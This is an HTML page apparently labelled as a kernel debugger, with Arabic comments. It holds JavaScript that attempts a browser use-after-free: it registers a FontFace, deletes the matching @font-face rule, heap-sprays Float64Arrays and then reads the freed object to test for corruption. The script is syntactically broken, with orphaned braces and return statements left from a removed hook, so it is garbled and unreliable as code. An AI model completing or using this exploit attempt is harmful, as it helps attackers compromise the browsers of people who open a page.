<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        #console { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; background: #0a0a0a; }
        .log { margin-bottom: 5px; font-size: 12px; }
    </style>
</head>
<body>
    <h3>JANUS_KERNEL_DEBUGGER v1.2 [FORCE_TRIGGER]</h3>
    <div id="console"></div>
    <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>

    <script>
        const log = (msg) => {
            const consoleDiv = document.getElementById('console');
            consoleDiv.innerHTML += `<div class="log">[LOG] ${msg}</div>`;
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        };

        window.onload = () => {
            log("INIT: Setting up memory traps...");
            
            // متغيرات عالمية لمنع التنظيف
            window.spray = [];
            let A = new FontFace('targetFont', 'url(https://invalid.url)', { unicodeRange: 'U+0041' });
            
            // استبدل الـ Hook القديم بهذا:
                    // بدلاً من الـ Hook، استخدم هذا:
document.fonts.ready.then(() => {
    log("Fonts ready state triggered!");
});

                        // تنفيذ التحرير
                        document.getElementById('s').sheet.deleteRule(0);
                        log("--- Rule deleted. Starting Heap Spray ---");
                        
                        // الضخ المباشر باستخدام Float64Array
                        for (let i = 0; i < 1000; i++) {
                            let arr = new Float64Array(32);
                            arr[0] = 0.123456789; 
                            window.spray.push(arr);
                        }
                        log("--- Spray complete. Checking stability ---");
                        
                        setTimeout(() => {
                            try {
                                let val = A.family;
                                log("READ_VALUE: " + val);
                            } catch(e) {
                                log("ERROR: " + e.message);
                            }
                        }, 500);
                        
                        return undefined;
                    }
                    return undefined;
                }
            });

            document.fonts.add(A);
            log("Triggering font load...");
            document.fonts.load('1em targetFont', 'AB');
        };
    </script>
</body>
</html>
